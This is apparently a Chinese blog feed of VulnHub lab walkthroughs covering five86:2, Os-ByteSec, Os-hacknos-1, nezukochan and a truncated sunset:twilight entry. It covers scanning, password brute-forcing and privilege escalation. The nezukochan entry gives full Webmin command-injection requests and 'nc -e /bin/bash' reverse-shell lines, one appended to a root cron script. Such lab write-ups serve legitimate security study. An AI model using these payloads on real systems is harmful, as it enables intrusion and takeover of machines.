    <content><![CDATA[<p>vulnhub里的 five86:2 靶机</p>
<p>简单/中等难度</p>
<a id="more"></a>



<h1 id="Five86-2"><a href="#Five86-2" class="headerlink" title="Five86:2"></a>Five86:2</h1><h2 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@kali:/home/kali/Downloads# nmap -Pn 192.168.2.0/24</span><br><span class="line"></span><br><span class="line">Nmap scan report for Five86-2 (192.168.2.164)</span><br><span class="line">Host is up (0.00035s latency).</span><br><span class="line">Not shown: 997 filtered ports</span><br><span class="line">PORT   STATE  SERVICE</span><br><span class="line">20/tcp closed ftp-data</span><br><span class="line">21/tcp open   ftp</span><br><span class="line">80/tcp open   http</span><br><span class="line">MAC Address: 00:0C:29:03:0D:4B (VMware)</span><br></pre></td></tr></table></figure>



<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@kali:/home/kali/Downloads# nmap -Pn 192.168.2.164 -A -p0-65535</span><br><span class="line"></span><br><span class="line">Nmap scan report for Five86-2 (192.168.2.164)</span><br><span class="line">Host is up (0.00045s latency).</span><br><span class="line">Not shown: 65533 filtered ports</span><br><span class="line">PORT   STATE  SERVICE  VERSION</span><br><span class="line">20/tcp closed ftp-data</span><br><span class="line">21/tcp open   ftp      ProFTPD 1.3.5e</span><br><span class="line">80/tcp open   http     Apache httpd 2.4.41 ((Ubuntu))</span><br><span class="line">|_http-generator: WordPress 5.1.4</span><br><span class="line">|_http-server-header: Apache/2.4.41 (Ubuntu)</span><br><span class="line">|_http-title: Five86-2 &amp;#8211; Just another WordPress site</span><br></pre></td></tr></table></figure>



<h2 id="http"><a href="#http" class="headerlink" title="http"></a>http</h2><p>先修改<code>/etc/hosts</code>文件，</p>
<img src="five86:2/image-20200710174649901.png" alt="image-20200710174649901" style="zoom:50%;" />

<p>访问之后是一个wordpress</p>
<img src="five86:2/image-20200710174712619.png" alt="image-20200710174712619" style="zoom:50%;" />

<h2 id="wpscan"><a href="#wpscan" class="headerlink" title="wpscan"></a>wpscan</h2><p>使用<code>wpscan</code>工具进行扫描爆破用户名</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@kali:/home/kali/Downloads# wpscan --url http://192.168.2.164 --enumerate u</span><br></pre></td></tr></table></figure>

<img src="five86:2/image-20200710174858886.png" alt="image-20200710174858886" style="zoom:50%;" />

<p>使用<code>rock_you.txt</code>爆破</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@kali:/home/kali/Downloads# wpscan --url http://192.168.2.164 -U ../2/username -P /usr/share/wordlists/rockyou.txt </span><br></pre></td></tr></table></figure>

<img src="five86:2/image-20200710175051573.png" alt="image-20200710175051573" style="zoom:50%;" />

<p>使用第一个账户登陆wordpress，</p>
<p>看一下插件列表</p>
<img src="five86:2/image-20200710175456330.png" alt="image-20200710175456330" style="zoom:50%;" />

<p>用<code>searchsploit</code>查找一下有没有可用的脚本</p>
<img src="five86:2/image-20200710175555690.png" alt="image-20200710175555690" style="zoom:50%;" />

<img src="five86:2/image-20200710175630756.png" alt="image-20200710175630756" style="zoom:50%;" />

<img src="five86:2/image-20200710175705366.png" alt="image-20200710175705366" style="zoom:50%;" />

<p>第三个插件有问题</p>
<img src="five86:2/image-20200710175816709.png" alt="image-20200710175816709" style="zoom:50%;" />

<p>按照步骤来，我把<code>index.php</code>里面的后门换成了反弹shell</p>
<p>本地监听，访问即可得到shell</p>
<img src="five86:2/image-20200710175924285.png" alt="image-20200710175924285" style="zoom:50%;" />



<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>切换到<code>stephen</code>账户，因为这个账户的密码和wordpress上面的一样。</p>
<p>顺便换一下终端</p>
<img src="five86:2/image-20200710180052997.png" alt="image-20200710180052997" style="zoom:50%;" />



<p>然后使用<code>ps -auxwww</code>查看进程</p>
<img src="five86:2/image-20200710180211630.png" alt="image-20200710180211630" style="zoom:50%;" />

<p>发现ftp是由<code>paul</code>账户运行的</p>
<p><font color='red'>由于ftp是明文传输的，可以使用抓包来抓取用户名和密码</font></p>
<img src="five86:2/image-20200710180343480.png" alt="image-20200710180343480" style="zoom:50%;" />

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">stephen@five86-2:~$timeout 150 tcpdump -i veth5e2d224 -w cap.pcap</span><br><span class="line">stephen@five86-2:~$tcpdump -r cap.pcap | grep &quot;PASS&quot;    </span><br></pre></td></tr></table></figure>

<img src="five86:2/image-20200710180512115.png" alt="image-20200710180512115" style="zoom:50%;" />

<p>得到了密码</p>
<p>切换到<code>paul</code>账户</p>
<img src="five86:2/image-20200710180539882.png" alt="image-20200710180539882" style="zoom:50%;" />

<p>查看一下可以提权的程序</p>
<img src="five86:2/image-20200710180610970.png" alt="image-20200710180610970" style="zoom:33%;" />

<p><code>service</code>是可以不用密码运行的，切换到peter账户</p>
<img src="five86:2/image-20200710180659729.png" alt="image-20200710180659729" style="zoom:33%;" />

<p>继续看能提权的程序</p>
<img src="five86:2/image-20200710180735697.png" alt="image-20200710180735697" style="zoom:33%;" />

<p>能用<code>passwd</code>，那就用它修改<code>root</code>的密码</p>
<img src="five86:2/image-20200710180828436.png" alt="image-20200710180828436" style="zoom:33%;" />

<p>成功提权</p>
]]></content>
      <categories>
        <category>exploit</category>
        <category>DC</category>
      </categories>
      <tags>
        <tag>exploit</tag>
        <tag>wordpress</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub hacks:Os-ByteSec靶机</title>
    <url>//Os-ByteSec.html</url>
    <content><![CDATA[<p>vulnhub里的 nezikochan 靶机</p>
<p>中等难度</p>
<a id="more"></a>



<h1 id="Os-ByteSec"><a href="#Os-ByteSec" class="headerlink" title="Os-ByteSec"></a>Os-ByteSec</h1><p>主机扫描/端口扫描</p>
<p>开启了<code>80 139 445 2525</code>端口</p>
<p>其中2525端口是ssh，139和445端口是smb</p>
<h2 id="80"><a href="#80" class="headerlink" title="80"></a>80</h2><p>什么都没有，扫描目录也没有啥东西</p>
<img src="hacknos:Os-ByteSec/image-20200722142948147.png" alt="image-20200722142948147" style="zoom:50%;" />

<p>只有最下面提示<code>smb</code></p>
<h2 id="smb"><a href="#smb" class="headerlink" title="smb"></a>smb</h2><p>使用<code>enum4linux</code>枚举一下目标靶机的账户</p>
<p><code>enum4linux -U 192.168.2.174</code></p>
<img src="hacknos:Os-ByteSec/image-20200722143305838.png" alt="image-20200722143305838" style="zoom:50%;" />

<p>得到了一个名为<code>smb</code>的用户</p>
<p>使用<code>msf</code>的<code>auxiliary/scanner/smb/smb_login </code>模块去爆破密码</p>
<img src="hacknos:Os-ByteSec/image-20200722143604720.png" alt="image-20200722143604720" style="zoom:50%;" />

<p>（其实推荐用<code>fastattack.txt</code>字典）</p>
<p>得到了密码为空</p>
<img src="hacknos:Os-ByteSec/image-20200722143630970.png" alt="image-20200722143630970" style="zoom:50%;" />

<p>使用<code>smbclient</code>登录smb</p>
<img src="hacknos:Os-ByteSec/image-20200722143725552.png" alt="image-20200722143725552" style="zoom:50%;" />

<p>发现并没有啥东西？？？</p>
<p>（翻了参考答案）</p>
<p>发现在<code>192.168.2.174/smb</code>目录下有东西（为什么？）</p>
<img src="hacknos:Os-ByteSec/image-20200722143822912.png" alt="image-20200722143822912" style="zoom:50%;" />

<p>下载下来之后，<code>main.txt</code>没东西，<code>safe.zip</code>需要密码</p>
<h2 id="fcrackzip"><a href="#fcrackzip" class="headerlink" title="fcrackzip"></a>fcrackzip</h2><p>使用<code>fcrackzip</code>破解</p>
<img src="hacknos:Os-ByteSec/image-20200722144000639.png" alt="image-20200722144000639" style="zoom:50%;" />

<p>得到了密码</p>
<p>解压之后得到一个<code>.cap</code>（流量包），使用<code>wireshark</code>分析之后发现是一个无线流量包（参考答案说的）</p>
<h2 id="aircrack-ng"><a href="#aircrack-ng" class="headerlink" title="aircrack-ng"></a>aircrack-ng</h2><p>使用<code>aircrack-ng</code>破解</p>
<img src="hacknos:Os-ByteSec/image-20200722144157918.png" alt="image-20200722144157918" style="zoom:50%;" />

<p>破解之后得到了<code>blackjax</code>用户和密码</p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>使用ssh连接，目录下面有一个<code>user.txt</code>，是一个flag</p>
<p>然后找提权的东西</p>
<p><code>find -perm -u=s -type f 2&gt;/dev/null</code></p>
<img src="hacknos:Os-ByteSec/image-20200722144457227.png" alt="image-20200722144457227" style="zoom:50%;" />

<p>发现这个<code>netscan</code>（别人的解题步骤上面直接说可疑然后一眼看出来该怎么做我是没想到的）</p>
<p>使用<code>cat</code>命令查看一下是什么类型文件</p>
<img src="hacknos:Os-ByteSec/image-20200722144617102.png" alt="image-20200722144617102" style="zoom:50%;" />

<p>看这个文件头，是一个可执行文件（不是shell脚本）</p>
<p>使用ida(32位)反编译</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  setuid(<span class="number">0</span>);</span><br><span class="line">  setgid(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;netstat -antp&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到这个文件直接运行了<code>netstat</code>命令</p>
<p>根据Linux命令的特性，使用<code>export PATH=/tmp:$PATH</code>劫持path，然后创建<code>/tmp/netstat</code>文件，这样运行<code>netscan</code>的时候会运行<code>/tmp/netstat</code>程序。</p>
<img src="hacknos:Os-ByteSec/image-20200722144949356.png" alt="image-20200722144949356" style="zoom:50%;" />

<p>并且使用<code>chmod 777 /tmp/netstat</code>给权限</p>
<img src="hacknos:Os-ByteSec/image-20200722145130078.png" alt="image-20200722145130078" style="zoom:50%;" />

<p>得到了root权限</p>
]]></content>
      <categories>
        <category>exploit</category>
        <category>hacknos</category>
      </categories>
      <tags>
        <tag>exploit</tag>
        <tag>smb</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub hacks:Os-hacknos-1靶机</title>
    <url>//Os-hacknos.html</url>
    <content><![CDATA[<p>vulnhub里的 nezikochan 靶机</p>
<p>简单/中等难度</p>
<a id="more"></a>



<h1 id="Os-hacknos-1"><a href="#Os-hacknos-1" class="headerlink" title="Os-hacknos-1"></a>Os-hacknos-1</h1><p>靶机的ip地址为<code>192.168.2.175</code></p>
<p>开放端口<code>22 80</code></p>
<h2 id="80"><a href="#80" class="headerlink" title="80"></a>80</h2><p>访问之后的页面是一个默认页面</p>
<img src="hacknos:Os-hacknos:1/image-20200726154227817.png" alt="image-20200726154227817" style="zoom:50%;" />

<p>扫描一下目录</p>
<p><code>dirb http://192.168.2.175 /usr/share/wordlist/dirb/big.txt</code></p>
<p><img src="hacknos:Os-hacknos:1/image-20200726154358206.png" alt="image-20200726154358206"></p>
<p>发现是一个<code>drupal</code>的网站</p>
<p>进去访问之后，也没有啥东西</p>
<img src="hacknos:Os-hacknos:1/image-20200726154431342.png" alt="image-20200726154431342" style="zoom:50%;" />

<p>尝试使用<code>msfconsole</code>的<code>search</code>寻找一下</p>
<p>这里选用的是</p>
<img src="hacknos:Os-hacknos:1/image-20200726154657427.png" alt="image-20200726154657427" style="zoom:50%;" />

<p>设置一下参数</p>
<img src="hacknos:Os-hacknos:1/image-20200726154856710.png" alt="image-20200726154856710" style="zoom:50%;" />

<p>看到出现了<code>opened</code>表示成功了</p>
<img src="hacknos:Os-hacknos:1/image-20200726155014184.png" alt="image-20200726155014184" style="zoom:50%;" />



<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>得到shell之后，在<code>../</code>(<code>/var/www/</code>)目录下发现了一个</p>
<img src="hacknos:Os-hacknos:1/image-20200726155224282.png" alt="image-20200726155224282" style="zoom:50%;" />

<p>里面是一段base64</p>
<p>解密出来之后是一段<code>brain fuck</code></p>
<img src="hacknos:Os-hacknos:1/image-20200726155315147.png" alt="image-20200726155315147" style="zoom:50%;" />

<p>再次解密之后</p>
<img src="hacknos:Os-hacknos:1/image-20200726155718450.png" alt="image-20200726155718450" style="zoom:50%;" />

<p>得到了<code>james</code>的密码是<code>Hacker@4514</code></p>
<p>使用ssh连接，发现并不可以，su也不能切换</p>
<img src="hacknos:Os-hacknos:1/image-20200726160048138.png" alt="image-20200726160048138" style="zoom:50%;" />

<img src="hacknos:Os-hacknos:1/image-20200726160058487.png" alt="image-20200726160058487" style="zoom:50%;" />

<p>那只能继续找提权的东西</p>
<img src="hacknos:Os-hacknos:1/image-20200726160159528.png" alt="image-20200726160159528" style="zoom:50%;" />

<p>发现<code>wget</code>有<code>setuid</code>权限，可以用它写入<code>/root/.ssh/</code>(但是并没有这个目录)</p>
<p>考虑使用<code>/etc/passwd</code>，先把里面的内容拷贝到一个文件里，然后使用openssl生成一个密码，加入账户中</p>
<img src="hacknos:Os-hacknos:1/image-20200726160550053.png" alt="image-20200726160550053" style="zoom:50%;" />

<p>然后仿照root的那一行写就行</p>
<p>使用su，提权到root</p>
<img src="hacknos:Os-hacknos:1/image-20200726160636869.png" alt="image-20200726160636869" style="zoom:50%;" />



]]></content>
      <categories>
        <category>exploit</category>
        <category>hacknos</category>
      </categories>
      <tags>
        <tag>exploit</tag>
        <tag>drupal</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub nezikochan靶机</title>
    <url>//nezikochan.html</url>
    <content><![CDATA[<p>vulnhub里的 nezikochan 靶机</p>
<p>初学者难度</p>
<a id="more"></a>

<h1 id="nezukochan"><a href="#nezukochan" class="headerlink" title="nezukochan"></a>nezukochan</h1><h2 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@kali:/home/kali# ifconfig</span><br><span class="line">eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 192.168.2.143  netmask 255.255.255.0  broadcast 192.168.2.255</span><br><span class="line">        inet6 fe80::20c:29ff:fe8d:d790  prefixlen 64  scopeid 0x20&lt;link&gt;</span><br><span class="line">        ether 00:0c:29:8d:d7:90  txqueuelen 1000  (Ethernet)</span><br><span class="line">        RX packets 16971  bytes 6082662 (5.8 MiB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 17155  bytes 1515848 (1.4 MiB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br></pre></td></tr></table></figure>



<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@kali:/home/kali# nmap -Pn 192.168.2.0/24</span><br><span class="line"></span><br><span class="line">Nmap scan report for 192.168.2.156</span><br><span class="line">Host is up (0.00096s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">22/tcp open  ssh</span><br><span class="line">80/tcp open  http</span><br><span class="line">MAC Address: 00:0C:29:16:32:FD (VMware)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@kali:/home/kali# nmap -Pn 192.168.2.156 -p0-65535 -A</span><br><span class="line"></span><br><span class="line">PORT      STATE SERVICE  VERSION</span><br><span class="line">22/tcp    open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 4b:f5:b3:ff:35:a8:c8:24:42:66:64:a4:4b:da:b0:16 (RSA)</span><br><span class="line">|   256 2e:0d:6d:5b:dc:fe:25:cb:1b:a7:a0:93:20:3a:32:04 (ECDSA)</span><br><span class="line">|_  256 bc:28:8b:e4:9e:8d:4c:c6:42:ab:0b:64:ea:8f:60:41 (ED25519)</span><br><span class="line">80/tcp    open  http     Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.29 (Ubuntu)</span><br><span class="line">|_http-title: Welcome to my site! - nezuko kamado</span><br><span class="line">13337/tcp open  ssl/http MiniServ 1.920 (Webmin httpd)</span><br><span class="line">| http-robots.txt: 1 disallowed entry </span><br><span class="line">|_/</span><br><span class="line">|_http-title: Login to Webmin</span><br><span class="line">| ssl-cert: Subject: commonName=*/organizationName=Webmin Webserver on ubuntu</span><br><span class="line">| Not valid before: 2019-08-20T09:28:46</span><br><span class="line">|_Not valid after:  2024-08-18T09:28:46</span><br><span class="line">|_ssl-date: TLS randomness does not represent time</span><br></pre></td></tr></table></figure>

<p>目标开启了 <code>22(ssh)</code> <code>80(http)</code> <code>13337(webadmin)</code></p>
<h2 id="http"><a href="#http" class="headerlink" title="http"></a>http</h2><img src="nezikochan/image-20200706152016523.png" alt="image-20200706152016523" style="zoom:50%;" />

<p>什么都没有，使用<code>dirbuster</code> 扫目录，也没什么东西</p>
<p><code>robots.txt</code> 有一段<code>basexx</code> 加密的东西，base全家桶一把梭，发现是<code>base32</code>，解密之后</p>
<img src="nezikochan/image-20200706152237275.png" alt="image-20200706152237275" style="zoom:50%;" />



<p>那么应该就是<code>13337</code>端口了</p>
<h2 id="webadmin"><a href="#webadmin" class="headerlink" title="webadmin"></a>webadmin</h2><img src="nezikochan/image-20200706152334542.png" alt="image-20200706152334542" style="zoom:50%;" />

<p>做到这里卡住了</p>
<p>找到了网上的wp，使用的是<code>CVE-2019-15231(15701)</code></p>
<p><a href="https://github.com/jas502n/CVE-2019-15107">https://github.com/jas502n/CVE-2019-15107</a></p>
<p>修改请求包</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;password_change.cgi HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.2.156:13337</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident&#x2F;5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: redirect&#x3D;1; testing&#x3D;1; sid&#x3D;x; sessiontest&#x3D;1</span><br><span class="line">Referer: https:&#x2F;&#x2F;192.168.2.156:13337&#x2F;session_login.cgi</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 60</span><br><span class="line"></span><br><span class="line">user&#x3D;rootxx&amp;pam&#x3D;&amp;expired&#x3D;2&amp;old&#x3D;test|id&amp;new1&#x3D;test2&amp;new2&#x3D;test2</span><br></pre></td></tr></table></figure>

<p>Response</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h3</span>&gt;</span></span><br><span class="line">	Failed to change password : The current password is incorrectuid=1000(nezuko) gid=1000(nezuko) groups=1000(nezuko),4(adm),24(cdrom),30(dip),46(plugdev),116(lpadmin),126(sambashare)</span><br><span class="line"><span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h2 id="reverse-shell"><a href="#reverse-shell" class="headerlink" title="reverse_shell"></a>reverse_shell</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;password_change.cgi HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.2.156:13337</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident&#x2F;5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: redirect&#x3D;1; testing&#x3D;1; sid&#x3D;x; sessiontest&#x3D;1</span><br><span class="line">Referer: https:&#x2F;&#x2F;192.168.2.156:13337&#x2F;session_login.cgi</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 60</span><br><span class="line"></span><br><span class="line">user&#x3D;rootxx&amp;pam&#x3D;&amp;expired&#x3D;2&amp;old&#x3D;test|nc -e &#x2F;bin&#x2F;bash 192.168.2.143 8848 &amp;new1&#x3D;test2&amp;new2&#x3D;test2</span><br></pre></td></tr></table></figure>



<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@kali:/home/kali# nc -vlp 8848</span><br><span class="line">listening on [any] 8848 ...</span><br><span class="line">192.168.2.156: inverse host lookup failed: Unknown host</span><br><span class="line">connect to [192.168.2.143] from (UNKNOWN) [192.168.2.156] 40030</span><br><span class="line">whoami</span><br><span class="line">nezuko</span><br></pre></td></tr></table></figure>



<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat &#x2F;etc&#x2F;passwd</span><br><span class="line">zenitsu:$6$LbPWwHSD$69t89j0Podkdd8dk17jNKt6Dl2.QYwSJGIX0cE5nysr6MX23DFvIAwmxEHOjhBj8rBplVa3rqcVDO0001PY9G0:1001:1001:,,,:&#x2F;home&#x2F;zenitsu:&#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure>

<p>复制到主机，使用<code>john</code> 破解hash，得到密码<code>meowmeow</code></p>
<blockquote>
<p>  不知道为什么，ssh直接连 zenitsu 连不上，所以就采用了别的办法</p>
</blockquote>
<p>使用<code>ssh-keygen</code> 生成一个ssh私钥，并把它写入到<code>nezuko/.ssh/au*</code> 下</p>
<p>然后用ssh连上 <code>nezuko</code>，切换到 <code>zenitsu</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">zenitsu@ubuntu:/home/nezuko$ whoami</span><br><span class="line">zenitsu</span><br><span class="line">zenitsu@ubuntu:/home/nezuko$ ls</span><br><span class="line">from_zenitsu  nezuko.txt</span><br><span class="line">zenitsu@ubuntu:/home/nezuko$ cd from_zenitsu/</span><br><span class="line">zenitsu@ubuntu:/home/nezuko/from_zenitsu$ ls -l</span><br><span class="line">total 40</span><br><span class="line">-rw-r--r-- 1 root root 54 Jul   6 15:15 new_message_06-07-2020_15:15</span><br><span class="line">-rw-r--r-- 1 root root 54 Jul   6 15:20 new_message_06-07-2020_15:20</span><br><span class="line">-rw-r--r-- 1 root root 54 Jul   6 15:25 new_message_06-07-2020_15:25</span><br><span class="line">-rw-r--r-- 1 root root 54 Jul   6 15:30 new_message_06-07-2020_15:30</span><br><span class="line">-rw-r--r-- 1 root root 54 Jul   6 15:35 new_message_06-07-2020_15:35</span><br><span class="line">-rw-r--r-- 1 root root 54 Ogos 21  2019 new_message_21-08-2019_01:13</span><br><span class="line">-rw-r--r-- 1 root root 54 Ogos 21  2019 new_message_21-08-2019_09:11</span><br><span class="line">-rw-r--r-- 1 root root 54 Ogos 21  2019 new_message_21-08-2019_09:12</span><br><span class="line">-rw-r--r-- 1 root root 54 Ogos 21  2019 new_message_21-08-2019_09:13</span><br><span class="line">-rw-r--r-- 1 root root 54 Ogos 21  2019 new_message_21-08-2019_09:40</span><br></pre></td></tr></table></figure>

<p>发现有每隔 5min 创建的消息，并且创建者是root</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">zenitsu@ubuntu:/home/nezuko/from_zenitsu$ cd ~/</span><br><span class="line">zenitsu@ubuntu:~$ ls</span><br><span class="line">to_nezuko  zenitsu.txt</span><br><span class="line">zenitsu@ubuntu:~$ cd to_nezuko/</span><br><span class="line">zenitsu@ubuntu:~/to_nezuko$ ls -al</span><br><span class="line">total 12</span><br><span class="line">drwxr-xr-x 2 zenitsu root    4096 Ogos 21  2019 .</span><br><span class="line">drwxr-xr-x 4 zenitsu zenitsu 4096 Ogos 21  2019 ..</span><br><span class="line">-rw-r--r-- 1 zenitsu root     150 Ogos 21  2019 send_message_to_nezuko.sh</span><br></pre></td></tr></table></figure>

<p>本目录下有一个sh脚本，应该也是5分钟运行一次，并且可写。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">zenitsu@ubuntu:~/to_nezuko$ echo &quot;nc -e /bin/bash 192.168.2.143 8848&quot; &gt;&gt; send_message_to_nezuko.sh </span><br></pre></td></tr></table></figure>

<p>本地监听，等待反弹shell</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@kali:/home/kali# nc -vlp 8848</span><br><span class="line">listening on [any] 8848 ...</span><br><span class="line">192.168.2.156: inverse host lookup failed: Unknown host</span><br><span class="line">connect to [192.168.2.143] from (UNKNOWN) [192.168.2.156] 39652</span><br><span class="line">ls</span><br><span class="line">root.txt</span><br><span class="line">whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>exploit</category>
        <category>neizikochan</category>
      </categories>
      <tags>
        <tag>exploit</tag>
        <tag>opennetadmin</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub sunset:twilight靶机</title>
    <url>//sunset-twilight.html</url>
    <content><![CDATA[<p>Vulnhub sunset系列</p>
<a id="more"></a>

<h1 id="sunset-Twilight"><a href="#sunset-Twilight" class="headerlink" title="sunset:Twilight"></a>sunset:Twilight</h1><ul>
<li>靶机ip: <code>192.168.6.129</code></li>
<li>kali ip: <code>192.168.6.128</code></li>
</ul>
<h2 id="端口扫描结果"><a href="#端口扫描结果" class="headerlink" title="端口扫描结果"></a>端口扫描结果</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">PORT      STATE SERVICE     VERSION</span><br><span class="line">22/tcp    open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 43:e9:45:ec:f4:5b:ed:e9:64:47:43:43:39:96:9d:c9 (RSA)</span><br><span class="line">|   256 ed:67:ad:31:04:17:ef:cf:75:02:05:db:88:94:97:a0 (ECDSA)</span><br><span class="line">|_  256 ed:41:e5:d1:b2:23:2c:d5:90:59:2a:37:8b:da:31:c1 (ED25519)</span><br><span class="line">25/tcp    open  smtp        Exim smtpd 4.92</span><br><span class="line">| smtp-commands: twilight Hello nmap.scanme.org [192.168.6.128], SIZE 52428800, 8BITMIME, PIPELINING, CHUNKING, PRDR, HELP, </span><br><span class="line">|_ Commands supported: AUTH HELO EHLO MAIL RCPT DATA BDAT NOOP QUIT RSET HELP </span><br><span class="line">80/tcp    open  http        Apache httpd 2.4.38 ((Debian))</span><br><span class="line">|_http-server-header: Apache/2.4.38 (Debian)</span><br><span class="line">|_http-title: Site doesn&#x27;t have a title (text/html; charset=UTF-8).</span><br><span class="line">139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span><br><span class="line">445/tcp   open  netbios-ssn Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)</span><br><span class="line">2121/tcp  open  ftp         pyftpdlib 1.5.6</span><br><span class="line">| ftp-anon: Anonymous FTP login allowed (FTP code 230)</span><br><span class="line">|_-rw-r--r--   1 root     root           35 Jul 16 12:21 22253251-65325.twilight</span><br><span class="line">| ftp-syst: </span><br><span class="line">|   STAT: </span><br><span class="line">| FTP server status:</span><br><span class="line">|  Connected to: 192.168.6.129:2121</span><br><span class="line">|  Waiting for username.</span><br><span class="line">|  TYPE: ASCII; STRUcture: File; MODE: Stream</span><br><span class="line">|  Data connection closed.</span><br><span class="line">|_End of status.</span><br><span class="line">3306/tcp  open  mysql       MySQL 5.5.5-10.3.22-MariaDB-0+deb10u1</span><br><span class="line">| mysql-info: </span><br><span class="line">|   Protocol: 10</span><br><span class="line">|   Version: 5.5.5-10.3.22-MariaDB-0+deb10u1</span><br><span class="line">|   Thread ID: 38</span><br><span class="line">|   Capabilities flags: 63486</span><br><span class="line">|   Some Capabilities: InteractiveClient, Speaks41ProtocolOld, IgnoreSpaceBeforeParenthesis, SupportsTransactions, Speaks41ProtocolNew, DontAllowDatabaseTableColumn, ConnectWithDatabase, SupportsCompression, SupportsLoadDataLocal, ODBCClient, IgnoreSigpipes, LongColumnFlag, FoundRows, Support41Auth, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults</span><br><span class="line">|   Status: Autocommit</span><br><span class="line">|   Salt: KGa5#NB&lt;G/R4L_w\H0YO</span><br><span class="line">|_  Auth Plugin Name: mysql_native_password</span><br><span class="line">8080/tcp  open  http        PHP cli server 5.5 or later</span><br><span class="line">|_http-open-proxy: Proxy might be redirecting requests</span><br><span class="line">|_http-title: Login - powered by Easy File Sharing Web Server</span><br><span class="line">63525/tcp open  http        PHP cli server 5.5 or later</span><br><span class="line">|_http-title: Login - powered by Easy File Sharing Web Server</span><br><span class="line">MAC Address: 00:0C:29:16:3E:01 (VMware)</span><br><span class="line">No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).</span><br></pre></td></tr></table></figure>

<p>大致上开启了 <code>80(http)</code> <code>2121(ftp)</code> 端口</p>
<h2 id="80端口"><a href="#80端口" class="headerlink" title="80端口"></a>80端口</h2><p><img src="https://i.loli.net/2020/09/15/6sczx1kGXMPto7j.png" alt="image-20200915001829728"></p>
<p>点击<code>pictures</code></p>
<p><img src="https://i.loli.net/2020/09/15/gJoG9OAPnryvs3U.png" alt="image-20200915001902578"></p>
<p>以为是<code>sql注入</code>结果手动尝试，并且<code>sqlmap</code>也测试了，并没有注入</p>
<p><img src="https://i.loli.net/2020/09/15/1jLMHD6zTXm9iV4.png" alt="image-20200915001948217"></p>
